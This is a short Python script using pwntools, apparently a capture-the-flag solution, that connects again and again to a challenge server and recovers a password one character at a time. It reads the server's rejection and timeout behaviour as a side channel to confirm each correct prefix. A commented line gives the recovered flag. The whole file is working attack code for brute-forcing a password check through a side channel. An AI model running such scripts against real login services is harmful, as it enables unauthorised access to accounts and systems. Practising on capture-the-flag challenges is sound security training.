import pwn
import string
import time
from pprint import pprint

pwn.context.log_level = 'warn'

# pw = 'X-MAS{S1D3CH4NN3LZ?wtf!!}'
pw = 'X-MAS{'
pool = set(string.printable) - {'\x0b', '\t', '\r', '\n', '\x0c'}
priority = list('}' + string.ascii_uppercase + string.digits + '_')
pool = pool - set(priority)
pool = priority + sorted(list(pool))

responses = {}

while True:
    found = False
    for c in pool:
        print()
        print('Testing: `{}`'.format(c))

        io = pwn.remote('challs.xmas.htsp.ro', 5051)
        io.recvuntilS('PLEASE INPUT PASSWORD:')

        p = pw + c
        before = time.time()
        io.sendline(p)

        t = len(pw) * 1.5

        try:
            output = io.recvuntilS('REJECTED', timeout=t)
            after = time.time()
            elapsed = (after - before) * 1000
            print('Response:', elapsed)
            responses[c] = elapsed
            print(output)
            continue
        except EOFError:
            print()
            print('---')
            print('Found:', c)
            pw += c
            print('Pw:', pw)
            print('---')
            found = True
            break

    if not found:
        print()
        print('---')
        print('Couldn''t find next char')
        print('---')
        break

pprint(responses)
